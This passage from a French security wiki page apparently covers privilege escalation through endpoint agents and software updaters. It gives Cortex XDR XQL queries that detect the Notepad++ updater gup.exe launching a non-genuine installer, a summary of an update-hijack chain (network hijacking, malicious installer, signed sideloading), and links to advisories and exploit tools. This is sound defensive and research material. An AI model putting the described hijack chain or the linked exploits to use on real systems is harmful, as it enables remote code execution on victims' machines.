| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> lançant un programme d’installation autre que celui de Notepad++</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Ces schémas s’appliquent à tout updater qui accepte des manifests non signés ou ne vérifie pas les signataires des installateurs : détournement du réseau + installateur malveillant + sideloading signé avec son propre certificat permettent une exécution de code à distance sous couvert de mises à jour « fiables ».

---
## References
- [1] [Avis – Netskope Client pour Windows – Élévation locale de privilèges via un serveur malveillant (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Avis de sécurité Netskope NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – plugin Netskope](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – client/exploit IPC de Netskope](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Exploitation d’ASUS DriverHub, MSI Center, Acer Control Centre et Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB : NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Élévation locale de privilèges via des fichiers accessibles en écriture dans Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Élévation de privilèges dans l’agent Windows](https://checkmk.com/werk/16361)
- [10] [PoC de sensepost/bloatware-pwn](https://github.com/sensepost/bloatware-pwn)
- [11] [PipeViewer de CyberArk](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Des acteurs étatiques exploitent la chaîne d’approvisionnement de Notepad++](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – mise à jour sur l’incident d’infrastructure détournée](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Contournement du correctif pour CVE-2025-0309 dans Netskope Client pour Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Découverte de failles d’élévation de privilèges dans Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
